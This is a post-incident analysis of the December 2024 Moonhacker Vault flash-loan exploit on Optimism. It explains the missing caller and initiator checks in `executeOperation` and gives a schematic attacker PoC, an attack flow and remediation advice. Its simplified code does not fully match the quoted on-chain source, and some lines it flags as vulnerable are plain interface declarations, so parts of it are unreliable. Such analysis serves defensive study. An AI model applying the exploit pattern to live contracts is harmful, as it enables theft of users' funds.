# Moonhacker — Flash Loan Double Borrow Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2024-12-24 |
| **Protocol** | Moonhacker Vault |
| **Chain** | Optimism |
| **Loss** | ~318,900 USD |
| **Attacker** | [0x36491840](https://optimistic.etherscan.io/address/0x36491840ebcf040413003df9fb65b6bc9a181f52) |
| **Attack Tx** | [0xd12016b2](https://optimistic.etherscan.io/tx/0xd12016b25d7aef681ade3dc3c9d1a1cc12f35b2c99953ff0e0ee23a59454c4fe) |
| **Vulnerable Contract** | [0xd9b45e2c](https://optimistic.etherscan.io/address/0xd9b45e2c389b6ad55dd3631abc1de6f2d2229847) |
| **Root Cause** | Moonhacker Vault's `executeOperation` callback does not validate the caller, allowing arbitrary triggering to manipulate Moonwell MToken's `borrowBalanceCurrent` and enable excess borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/Moonhacker_exp.sol) |

---
## 1. Vulnerability Overview

Moonhacker Vault implemented the `executeOperation` callback for AAVE flash loans. This callback read the borrow balance (`borrowBalanceCurrent`) from Moonwell's MToken to manage funds. An attacker could directly call Moonhacker's `executeOperation` or trigger an AAVE flash loan to manipulate the MToken's borrow state and double-withdraw USDC without actual repayment.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Moonhacker Vault: No access control on executeOperation
contract MoonhackerVault {
    IMusdc mUSDC;

    function executeOperation(
        address token,
        uint256 amountBorrowed,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external {
        // ❌ No validation that msg.sender == AAVE Pool
        // ❌ No validation that initiator == address(this)

        // Query borrow balance from Moonwell MToken
        uint256 borrowBalance = mUSDC.borrowBalanceCurrent(address(this));
        // ❌ Trusts borrowBalance to transfer excess USDC
        IERC20(USDC).transfer(initiator, borrowBalance);
    }
}

// ✅ Fix:
// require(msg.sender == AAVE_POOL, "not aave pool");
// require(initiator == address(this), "not self");
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: MoonHacker.sol
    function  executeOperation(  // ❌ Vulnerability
        address token,
        uint256 amountBorrowed,
        uint256 premium,
        address initiator,
        bytes calldata params
    )  external returns (bool) {
        
        (SmartOperation operation, address mToken, uint256 amountToSupplyOrReedem) = abi.decode(params, (SmartOperation, address, uint256));
        uint256 totalAmountToRepay = amountBorrowed + premium;

        if (operation == SmartOperation.SUPPLY) {
            //get amount to supply from user
            //IERC20(token).transferFrom(owner, address(this), amountToSupplyOrReedem); ==> removed, we do transfer instead of approve from outside

            //approve total amount to supply 
            uint256 totalSupplyAmount = amountBorrowed + amountToSupplyOrReedem;
            IERC20(token).approve(mToken, totalSupplyAmount);

            //supply total amount
            require(IMToken(mToken).mint(totalSupplyAmount) == 0, "mint failed");

            //borrow amount borrowed from aave plus aave fee
            require(IMToken(mToken).borrow(totalAmountToRepay) == 0, "borrow failed");

            //pay back to aave
            IERC20(token).approve(address(POOL), totalAmountToRepay);

        } else if (operation == SmartOperation.REDEEM) {
            
            //repay
            IERC20(token).approve(mToken, amountBorrowed);
            require(IMToken(mToken).repayBorrow(amountBorrowed) == 0, "repay borrow failed");
    // ... (5 lines omitted) ...

        } else {

            revert("invalid op");
        }

        if (strcmp(IERC20Detailed(token).symbol(), "WETH")) {
            //WE received ETH, we need to call 'deposit' now to wrap it into WETH
            IWETH(token).deposit{value: totalAmountToRepay}();
        }

        //pay back to aave
        IERC20(token).approve(address(POOL), totalAmountToRepay);

        return true;
    }
```

```solidity
// File: IPool.sol
  function borrow(  // ❌ Vulnerability
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
  ) external;

  /**
   * @notice Repays a borrowed `amount` on a specific reserve, burning the equivalent debt tokens owned
   * - E.g. User repays 100 USDC, burning 100 variable/stable debt tokens of the `onBehalfOf` address
   * @param asset The address of the borrowed underlying asset previously borrowed
   * @param amount The amount to repay
   * - Send the value type(uint256).max in order to repay the whole debt for `asset` on the specific `debtMode`
   * @param interestRateMode The interest rate mode at of the debt the user wants to repay: 1 for Stable, 2 for Variable
   * @param onBehalfOf The address of the user who will get his debt reduced/removed. Should be the address of the
   * user calling the function if he wants to reduce/remove his own debt, or the address of any other
   * other borrower whose debt should be removed
   * @return The final amount repaid
   */
  function repay(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    address onBehalfOf
  ) external returns (uint256);

  /**
   * @notice Repay with transfer approval of asset to be repaid done via permit function
   * see: https://eips.ethereum.org/EIPS/eip-2612 and https://eips.ethereum.org/EIPS/eip-713
   * @param asset The address of the borrowed underlying asset previously borrowed
   * @param amount The amount to repay
   * - Send the value type(uint256).max in order to repay the whole debt for `asset` on the specific `debtMode`
   * @param interestRateMode The interest rate mode at of the debt the user wants to repay: 1 for Stable, 2 for Variable
   * @param onBehalfOf Address of the user who will get his debt reduced/removed. Should be the address of the
   * user calling the function if he wants to reduce/remove his own debt, or the address of any other
   * other borrower whose debt should be removed
   * @param deadline The deadline timestamp that the permit is valid
   * @param permitV The V parameter of ERC712 permit sig
   * @param permitR The R parameter of ERC712 permit sig
   * @param permitS The S parameter of ERC712 permit sig
```

```solidity
// File: DataTypes.sol
    ReserveConfigurationMap configuration;
    //the liquidity index. Expressed in ray
    uint128 liquidityIndex;
    //the current supply rate. Expressed in ray
    uint128 currentLiquidityRate;
    //variable borrow index. Expressed in ray
    uint128 variableBorrowIndex;
    //the current variable borrow rate. Expressed in ray
    uint128 currentVariableBorrowRate;
    //the current stable borrow rate. Expressed in ray
    uint128 currentStableBorrowRate;
    //timestamp of last update
    uint40 lastUpdateTimestamp;
    //the id of the reserve. Represents the position in the list of the active reserves
    uint16 id;
    //aToken address
    address aTokenAddress;
    //stableDebtToken address
    address stableDebtTokenAddress;
    //variableDebtToken address
    address variableDebtTokenAddress;
    //address of the interest rate strategy
    address interestRateStrategyAddress;
    //the current treasury balance, scaled
    uint128 accruedToTreasury;
    //the outstanding unbacked aTokens minted through the bridging feature
    uint128 unbacked;
    //the outstanding debt borrowed against this asset in isolation mode
    uint128 isolationModeTotalDebt;
```

## 3. Attack Flow

```
Attacker (0x36491840)
  │
  ├─[1]─▶ Deploy Attacker contract
  │
  ├─[2]─▶ AAVE V3.flashLoanSimple(Moonhacker, USDC, amount, params)
  │         or direct call to executeOperation
  │
  ├─[3]─▶ Moonhacker.executeOperation() executes:
  │         calls mUSDC.borrowBalanceCurrent()
  │         └─ ❌ Returns manipulated borrowBalance
  │             Moonhacker transfers its USDC to attacker
  │
  ├─[4]─▶ Repay AAVE flash loan (USDC)
  │
  └─[5]─▶ ~318,900 USD USDC drained
```

## 4. PoC Code

```solidity
contract Attacker {
    function exploit() external {
        // Trigger AAVE flash loan (with Moonhacker as receiver)
        aaveV3.flashLoanSimple(
            address(moonhacker),  // ← Moonhacker receives executeOperation
            address(USDC),
            attackAmount,
            abi.encode(/* manipulated params */),
            0
        );
        // Or call executeOperation directly
        moonhacker.executeOperation(
            address(USDC),
            attackAmount,
            0,
            address(this),
            abi.encode(/* params */)
        );
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan callback authentication missing |
| **Attack Vector** | Unvalidated `executeOperation` + MToken `borrowBalance` manipulation |
| **CWE** | CWE-346: Origin Validation Error |
| **DASP** | Access Control Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **Pool Validation**: Verify `msg.sender == AAVE_POOL`
2. **Initiator Validation**: Verify `initiator == address(this)`
3. **Do Not Trust borrowBalance**: Never unconditionally trust return values from external contracts
4. **AAVE executeOperation Pattern**: Follow the secure implementation pattern from official AAVE documentation

## 7. Lessons Learned

- AAVE `executeOperation` must simultaneously validate both conditions: `msg.sender == AAVE_POOL` AND `initiator == address(this)`.
- External contract return values such as Moonwell MToken's `borrowBalanceCurrent` can be manipulated.
- When a Vault contract implements a flash loan callback, the strictest authentication standards must be applied.